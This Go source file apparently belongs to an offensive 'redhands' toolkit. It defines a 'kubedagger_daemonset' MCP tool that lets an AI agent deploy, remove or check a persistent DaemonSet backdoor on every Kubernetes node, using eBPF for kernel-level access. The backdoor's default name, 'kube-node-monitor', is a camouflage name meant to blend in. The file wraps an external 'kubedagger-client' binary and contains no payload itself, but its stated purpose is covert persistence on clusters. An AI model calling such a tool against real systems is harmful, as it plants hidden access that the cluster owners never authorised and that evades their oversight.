package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type DaemonsetInput struct {
	Action string `json:"action,omitempty"`
	Image  string `json:"image,omitempty"`
	Name   string `json:"name,omitempty"`
}

type DaemonsetTool struct {
	exec executor.Executor
}

func NewDaemonset(exec executor.Executor) *DaemonsetTool {
	return &DaemonsetTool{exec: exec}
}

func (t *DaemonsetTool) Name() string { return "kubedagger_daemonset" }

func (t *DaemonsetTool) Description() string {
	return "Deploy, remove, or check status of a persistent DaemonSet backdoor across all cluster nodes. Runs on every node to maintain kernel-level access via eBPF programs."
}

func (t *DaemonsetTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["deploy", "remove", "status"],
				"description": "DaemonSet action (default: deploy)"
			},
			"image": {
				"type": "string",
				"description": "Container image to use for the DaemonSet"
			},
			"name": {
				"type": "string",
				"description": "DaemonSet name (default: kube-node-monitor)"
			}
		}
	}`)
}

func (t *DaemonsetTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input DaemonsetInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Image, "image"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Name, "name"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"daemonset"}
	if input.Action != "" {
		args = append(args, "--action", input.Action)
	}
	if input.Image != "" {
		args = append(args, "--image", input.Image)
	}
	if input.Name != "" {
		args = append(args, "--name", input.Name)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger daemonset failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	action := input.Action
	if action == "" {
		action = "deploy"
	}
	fmt.Fprintf(&sb, "## KubeDagger DaemonSet: %s\n\n", action)
	if output == "" {
		sb.WriteString("Operation complete.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
